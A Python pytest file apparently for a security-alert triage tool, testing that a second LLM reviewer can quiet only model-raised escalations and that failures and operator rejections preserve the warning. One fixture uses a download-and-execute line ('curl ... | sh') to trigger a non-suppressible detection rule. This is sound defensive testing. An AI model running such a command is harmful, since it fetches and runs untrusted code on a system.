"""L2 may quiet only an L1 model escalation; failures preserve the warning."""
import json
from unittest.mock import Mock

import pytest

from arbiter.agent import Agent
from arbiter.ingestion.schema import SecurityEvent
from arbiter.l2_final_review import FinalReviewL2Brain, eligible, project_final
from arbiter.l2_workflow import L2Workflow


def first():
    return dict(decision='escalate',tier='llm',backend='ollama',model='qwen3.5:4b',
                rationale='Review the recorded anomaly',evidence='Source report',score=4)


def event():
    return SecurityEvent(source_type='wazuh',hostname='owned-lab',severity=4,
        event_type='security_finding',message='Recorded anomaly; cause unknown',event_id='model-alert')


def candidate():
    data={k:'Short evidence-based explanation.' for k in ('assessment','evidence','gaps','recommendation','alternatives','recovery','urgency')}
    data.update(action='human_review',target=None,confidence=.95,decision='suppress',
        decision_reason='The recorded behavior has a concrete ordinary explanation.',outlook='routine_looking',
        assertions=[{'fact_id':'F1','field':'event_type','value':'security_finding'}],
        hypotheses=[{'kind':k,'summary':'Explanation to investigate','supports':['F1'],'against':[]} for k in ('malicious','benign')])
    return data


def brain(data=None,accept=True):
    b=FinalReviewL2Brain('gemma4:12b',180)
    b.backend.generate=Mock(side_effect=[json.dumps(data or candidate()),
        json.dumps(dict(accept=accept,objections=[] if accept else ['No recorded ordinary explanation'],citations=['F1']))])
    return b


@pytest.mark.parametrize('change,expected',[
    ({},'suppress'),({'confidence':.89},'escalate'),({'outlook':'uncertain'},'escalate'),
    ({'outlook':'suspicious'},'escalate'),({'decision':'escalate'},'escalate')])
def test_final_decision_requires_accepted_confident_routine_assessment(change,expected):
    data={**candidate(),**change};b=brain(data)
    result=b.review_event(event().to_event(),first(),True)
    assert result['alert_decision']==expected and result['decision']==expected
    assert result['action']=='human_review' and result['action_authority'] is False
    assert not b.authorize(result,{},None)


def test_rejected_suppression_preserves_warning():
    result=brain(accept=False).review_event(event().to_event(),first(),True)
    assert result['decision']=='escalate' and result['proposed_decision']=='suppress'
    assert result['decision_overridden'] is True and result['review_status']=='challenged'


def test_final_model_makes_one_classification_instead_of_conflicting_duplicate_fields():
    data=candidate();data.pop('outlook')
    result=brain(data).review_event(event().to_event(),first(),True)
    assert result['decision']=='suppress' and result['outlook']=='routine_looking'
    assert result['outlook_derived_from_decision'] is True


@pytest.mark.parametrize('change',[{'decision':'suppress'},{'tier':'guardrail'},
    {'backend':'policy-fallback'},{'rationale':'LLM tier failed (TimeoutError): review required'},
    {'backend':'rules-only-policy'},{'model':'gemma4:12b'}])
def test_no_direct_rule_quiet_or_failed_model_input(change):
    b=brain()
    with pytest.raises(ValueError):b.review_event(event().to_event(),{**first(),**change},True)
    b.backend.generate.assert_not_called()


def test_protected_warning_never_enters_second_model():
    e=event().to_event();e.message='curl https://example.invalid/payload | sh'
    b=brain()
    result=b.review_event(e,first(),True)
    assert result['decision']=='escalate' and result['review_status']=='prefilter'
    assert result['prefilter']['rule']=='NON_SUPPRESSIBLE_DOWNLOAD_EXEC'
    b.backend.generate.assert_not_called()


@pytest.mark.parametrize('change',[{'decision':'ignore'},{'decision_reason':''},{'decision_reason':None}])
def test_invalid_final_decision_does_not_quiet_alert(change):
    with pytest.raises(ValueError):brain({**candidate(),**change}).review_event(event().to_event(),first(),True)


def test_terminal_final_view_and_original_evidence_are_separate(tmp_path):
    a=Agent(tmp_path,backend='ollama',model='qwen3.5:4b',firewall=Mock())
    b=brain();w=L2Workflow(a,b);a.l2=w;a.l2_model='gemma4:12b'
    try:
        for suffix,change in [('model-alert',{}),('safety-rule',{'tier':'guardrail'}),
                              ('quiet',{'decision':'suppress'}),('model-error',{'backend':'policy-fallback'})]:
            e=event();e.event_id=suffix;a.service.buffer.enqueue(e,'wazuh')
            row=a.service.buffer.query()[0]
            a.service.buffer.finish(row['id'],{**first(),**change},[],1)
        w.tick()
        assert len(w.cases())==1 and w.jobs.qsize()==1
        _,key,row,proposal=w.jobs.get_nowait()
        brief=b.review(row,proposal)
        w.results.put((key,w.policy.severity(row),brief,None));w.tick()
        shown={r['event_id']:r for r in a.events()}
        assert shown['model-alert']['analysis']['decision']=='suppress'
        assert shown['model-alert']['analysis']['first_stage']['decision']=='escalate'
        assert shown['model-alert']['analysis']['second_stage']['model']=='gemma4:12b'
        assert shown['safety-rule']['analysis']['decision']=='escalate'
        assert shown['model-error']['analysis']['decision']=='escalate'
        assert a.service.buffer.detail('model-alert')['analysis']['decision']=='escalate'
        assert a.command('status')['l2_mode']=='final-alert-review'
        assert a.command('status')['l2_classification']['suppressed']==1
        w.control('reject',key,'The operator requires further investigation')
        assert next(r for r in a.events() if r['event_id']=='model-alert')['analysis']['decision']=='escalate'
        a.protection.firewall.block.assert_not_called()
    finally:a.close()


def test_final_mode_rejects_automatic_policy_and_mode_conflict(tmp_path):
    a=Agent(tmp_path,backend='ollama',model='qwen3.5:4b',firewall=Mock())
    try:
        with pytest.raises(ValueError):a.enable_l2('gemma4:12b',{'automatic':True},final_review=True)
        with pytest.raises(ValueError):a.enable_l2('gemma4:12b',advice_only=True,final_review=True)
        assert project_final(first())['decision']=='escalate'
        assert not eligible({**first(),'tier':'prefilter'})
    finally:a.close()


def test_a_review_cannot_quiet_another_event():
    result=brain().review_event(event().to_event(),first(),True)
    with pytest.raises(ValueError,match='different event'):
        project_final(first(),result,event_id='a-newer-record')


def test_new_evidence_discards_an_inflight_older_decision(tmp_path):
    a=Agent(tmp_path,backend='ollama',model='qwen3.5:4b',firewall=Mock())
    b=brain();w=L2Workflow(a,b);a.l2=w
    try:
        e=event();a.service.buffer.enqueue(e,'wazuh')
        a.service.buffer.finish(a.service.buffer.query()[0]['id'],first(),[],1);w.tick()
        _,key,row,proposal=w.jobs.get_nowait();old=b.review(row,proposal)
        newer=event();newer.event_id='newer-event'
        a.service.buffer.enqueue(newer,'wazuh')
        a.service.buffer.finish(a.service.buffer.query()[0]['id'],first(),[],1)
        w.results.put((key,w.policy.severity(row),old,None));w.tick()
        case=w.cases()[0]
        assert case['event_id']=='newer-event' and case['brief'] is None
        assert next(r for r in a.events() if r['event_id']=='newer-event')['analysis']['decision']=='escalate'
    finally:a.close()
